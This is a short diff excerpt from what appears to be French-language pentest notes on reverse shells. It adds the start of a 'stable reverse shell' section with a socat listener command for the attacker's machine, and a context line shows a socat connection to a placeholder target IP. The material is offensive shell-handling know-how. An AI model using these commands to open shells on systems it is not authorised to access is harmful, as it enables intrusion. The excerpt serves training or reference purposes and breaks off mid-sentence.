@@ -56,3 +56,11 @@ user@ip: ~$ socat TCP:<TARGET-IP>:<TARGET-PORT> -
 
 ## __Stable Reverse shell__
 
+Pour setup un reverse shell entièrement stable, on va
+
+#### 1- Listener -- Notre machine
+
+```shell
+user@ip: ~$ socat TCP-L:<port> FILE:`tty`,raw,echo=0
+```
+
